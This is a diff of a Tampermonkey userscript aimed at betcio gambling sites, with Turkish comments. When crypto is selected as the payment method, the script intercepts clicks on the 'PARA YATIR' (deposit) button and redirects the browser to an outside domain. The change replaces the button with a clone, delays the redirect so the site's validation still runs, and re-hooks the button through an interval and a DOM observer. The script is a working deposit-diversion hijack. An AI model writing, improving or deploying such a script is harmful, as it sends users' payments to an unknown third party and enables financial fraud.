@@ -1,8 +1,8 @@
 // ==UserScript==
-// @name         Betcio - Kripto Span + PARA YATIR Yönlendirme (2026)
+// @name         Betcio - Kripto Span + PARA YATIR Yönlendirme (Düzeltilmiş)
 // @namespace    http://tampermonkey.net/
-// @version      1.3
-// @description  Span'da kripto/lipay varsa ve PARA YATIR butonuna basılırsa otofasthavale.pro'ya gider
+// @version      1.4
+// @description  Span'da kripto varsa ve PARA YATIR'a basılırsa yönlendir (buton enable sorunu minimize)
 // @match        *://*.betcio*/*
 // @match        *://m.betcio*/*
 // @grant        none
@@ -28,21 +28,16 @@
     function isKriptoSecili() {
         const span = getElementByXPath(METHOD_SPAN_XPATH);
         if (!span) return false;
-
         const text = (span.textContent || '').toLowerCase().trim();
-        // console.log('[Debug] Span içeriği:', text);   // ← istersen aç
-
         return KRIPTO_KELIMELER.some(k => text.includes(k));
     }
 
     function findParaYatirButton() {
         const candidates = document.querySelectorAll('button[type="submit"], button.btn, button[class*="deposit"], button.a-color');
-
         for (const btn of candidates) {
             const text = (btn.textContent || '').trim().toUpperCase();
             const title = (btn.getAttribute('title') || '').toUpperCase();
             const classes = btn.className.toLowerCase();
-
             if ((text.includes('PARA YATIR') || title.includes('PARA YATIR')) && classes.includes('deposit')) {
                 return btn;
             }
@@ -56,53 +51,26 @@
         const button = findParaYatirButton();
         if (!button) return;
 
-        // Butonu zorla aktif tutmaya çalış (sitelerin bazıları attribute'ı dinamik değiştirir)
-        if (button.disabled || button.hasAttribute('disabled')) {
-            button.disabled = false;
-            button.removeAttribute('disabled');
-        }
+        // Önceki listener'ları temizlemek için (tekrar eklenmesin)
+        const clone = button.cloneNode(true);
+        button.parentNode.replaceChild(clone, button);
 
-        // En erken yakalama: pointerdown → çoğu sitede submit'ten önce gelir
-        const hijack = function(e) {
-            console.log('Kripto + PARA YATIR → yönlendirme tetiklendi');
-            window.location.href = 'https://otofasthavale.pro';
-        };
+        // NORMAL fazda dinle → sitenin validation'ı çalışsın
+        clone.addEventListener('click', function(e) {
+            // Hemen yönlendir, ama preventDefault YAPMA (sitelerin bazıları buna çok duyarlı)
+            console.log('Kripto + PARA YATIR tıklandı → yönlendirme');
 
-        button.addEventListener('pointerdown', hijack, { capture: true, passive: false });
-        button.addEventListener('mousedown', hijack, { capture: true, passive: false });
-        button.addEventListener('click', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            hijack(e);
-        }, { capture: true });
+            // Küçük gecikme ile yönlendir (validation'ın tamamlanmasına izin ver)
+            setTimeout(() => {
+                window.location.href = 'https://otofasthavale.pro';
+            }, 50);  // 50ms genelde yeterli
+
+        }, false);  // capture: false → normal bubbling fazı
     }
 
-    // Başlangıç kontrolleri
-    setTimeout(setupYonlendirme, 700);
+    setTimeout(setupYonlendirme, 1000);
+    setInterval(setupYonlendirme, 800);
 
-    // Periyodik + dinamik değişim takibi
-    const interval = setInterval(setupYonlendirme, 600);
-
-    const observer = new MutationObserver(() => {
-        setupYonlendirme();
-    });
-
-    observer.observe(document.body, {
-        childList: true,
-        subtree: true,
-        attributes: true,
-        characterData: true
-    });
-
-    // Butonun disabled durumunu ekstra zorla kontrol (bazı sitelerde işe yarar)
-    setInterval(() => {
-        if (isKriptoSecili()) {
-            const btn = findParaYatirButton();
-            if (btn && (btn.disabled || btn.hasAttribute('disabled'))) {
-                btn.disabled = false;
-                btn.removeAttribute('disabled');
-            }
-        }
-    }, 400);
-
+    const observer = new MutationObserver(setupYonlendirme);
+    observer.observe(document.body, { childList: true, subtree: true, attributes: true });
 })();
